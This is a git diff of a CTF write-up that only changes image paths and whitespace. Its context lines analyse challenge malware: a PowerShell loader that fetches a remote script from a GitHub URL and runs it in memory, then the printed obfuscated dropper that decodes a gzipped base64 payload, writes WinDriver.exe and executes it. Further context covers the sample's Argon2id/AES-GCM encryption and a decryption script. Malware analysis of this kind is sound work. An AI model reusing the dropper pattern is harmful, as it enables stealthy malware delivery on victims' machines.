@@ -2,12 +2,12 @@
 title: "Schematics NPC CTF 2025 Finals"
 description: "Write ups from the challenge that I solved alongside with collaboration of my team HARO2b in Finals of SCHEMATICS NPC CTF 2025"
 pubDate: "Nov 16 2025"
-heroImage: "/images/sch/HeaderNPC.jpg"
+heroImage: "./assets/hero.jpg"
 ---
 
 Write ups from the challenge that I solved alongside with collaboration of my team `HARO2b` in Finals of SCHEMATICS NPC CTF 2025 CTF. Acquiring Top 5 leaderboard and this is my team score when it ended :
 
-![](/images/sch/result.jpg)
+![](./assets/result.jpg)
 
 ## Download RAM
 ### Description
@@ -26,18 +26,18 @@ ngth)] -join
 
 ### Solution
 
-We given a script that 
-1. recovering an URL that being encoded with reverse + base64 
-2. download a remote powershell script from that URL 
-3. execute it in memory. 
+We given a script that
+1. recovering an URL that being encoded with reverse + base64
+2. download a remote powershell script from that URL
+3. execute it in memory.
 
-![](/images/sch/ram/0.png)
+![](./assets/ram/0.png)
 
 After we decode it, the result is link to the https://raw.githubusercontent.com/0xhonque/upgrade-ram/main/32-gigabyte.ps1.
 
 ```ps1
 (...)
-$haalloobim=@('ALUfXSMb', 'kzPJTOhj', 'zJFYUuHT', 'hnUdOCdf', 'CFgkifyq', 'ivreMlLH', 'EImewcER', 'QBqwTcWa', 'mKfgwpoe', 'ljppZrtv', 'hWjXjngK', 'OmokJxpb', 'tbxKOpby', 'WRLglWqY', 'ewBQTJcP', 'HFFotQRb', 'ejnZSAFp', 'LggnGysX', 'sgvMVlXu', 'eUOkuZrL', 'FKDNtidm', 'Mmvmfqbq', 'oTRBcTKD', 'CMZDzfvR', 'BhKJxNAT', 'HIoywfdZ', 'QjTjAljX', 'JvezFEPY', 'oOEchGBO', 'YZkLcLLL', 'EHwCZdmn', 'yZvfhDOm', 'jzQFgzZO', 'WlmHBGKE', 'UUoFVJvG',  
+$haalloobim=@('ALUfXSMb', 'kzPJTOhj', 'zJFYUuHT', 'hnUdOCdf', 'CFgkifyq', 'ivreMlLH', 'EImewcER', 'QBqwTcWa', 'mKfgwpoe', 'ljppZrtv', 'hWjXjngK', 'OmokJxpb', 'tbxKOpby', 'WRLglWqY', 'ewBQTJcP', 'HFFotQRb', 'ejnZSAFp', 'LggnGysX', 'sgvMVlXu', 'eUOkuZrL', 'FKDNtidm', 'Mmvmfqbq', 'oTRBcTKD', 'CMZDzfvR', 'BhKJxNAT', 'HIoywfdZ', 'QjTjAljX', 'JvezFEPY', 'oOEchGBO', 'YZkLcLLL', 'EHwCZdmn', 'yZvfhDOm', 'jzQFgzZO', 'WlmHBGKE', 'UUoFVJvG',
 ...
 'AQJWDRRV', 'pETLcqHt', 'fDfQrcQM', 'VWfIjXOd', 'gRSmsNAt', 'ondQkegj', 'ZBmeWStl', 'KpnjZzha', 'sGTiuoCj', 'rkkecwNp', 'TXjIVoTU', 'BNUoIOkn', 'qADpdAuW', 'GJTiuGgc', 'fUXCAhEA', 'HtXfHVZz', 'dWWmOMbY', 'PJBHRjbo', 'qYWfCaIP', 'hxHMomYi', 'xzWGpQvy', 'gcHnBPRK', 'IDXYkbip', 'aUPFgoAI', 'TAQuTpfd', 'TXklrYpf', 'LJrJCwdN', 'IYeTUdeK', 'OTQFJnDi', 'kmIUZgtV', 'xJhXyEmf', 'QiWickIx', 'iMOfsJcU');$jjcho = "";foreach ($winter in $haalloobim) {$jjcho += (Get-Variable -Name $winter -ValueOnly)};$mirai = [System.Convert]::FromBase64String($jjcho);$daffainfo = New-Object IO.MemoryStream(, $mirai);$hygge = New-Object IO.Compression.GzipStream($daffainfo, [IO.Compression.CompressionMode]::Decompress);$rootkids = New-Object IO.MemoryStream;$hygge.CopyTo($rootkids);$hygge.Dispose(); $daffainfo.Dispose();$djumanto = $rootkids.ToArray(); $rootkids.Dispose();$hanz = (Get-Location).Path;$revprm = Join-Path $hanz "WinDriver.exe";[IO.File]::WriteAllBytes($revprm, $djumanto);$etern1tydark = "ssecorP-tratS";$requiiem = $etern1tydark[-1..-($etern1tydark.Length)] -join '';& $requiiem -FilePath $revprm
 ```
@@ -520,7 +520,7 @@ The encryption wrapper therefore does:
 
 Here \u2002 is a SHA-256 helper that returns a hex string, and 7EBAC...\u202f() base64-decodes to the Pink Floyd lyric: `And_no_one_sings_me_lullabies__And_no_one_makes_me_close_my_eyes__So_I_throw_the_windows_wide__Call_to_you_across_the_sky`
 
-The key derivation is implemented by private static byte[]. This means the Argon2id password is reverse(timestamp) + spice, with a random 16-byte salt, and Argon2 parameters: time_cost 4, memory_cost 65536 KB, parallelism 8, output length 32 bytes. 
+The key derivation is implemented by private static byte[]. This means the Argon2id password is reverse(timestamp) + spice, with a random 16-byte salt, and Argon2 parameters: time_cost 4, memory_cost 65536 KB, parallelism 8, output length 32 bytes.
 
 After the key is computed, encryption proceeds in one of two modes:
 1. AES-GCM mode (when random.Next() % 2 == 0). The code generates a 12-byte nonce, encrypts the base64 plaintext with AesGcm, and gets (ciphertext, tag). The final textual format is:
@@ -718,7 +718,7 @@ if __name__ == "__main__":
     decrypt_meddle_file(enc_file, out_file)
 ```
 
-![](/images/sch/ram/2.png)
+![](./assets/ram/2.png)
 
 After running the script with the enc file we got a PNG, open it and we got the flag.
 
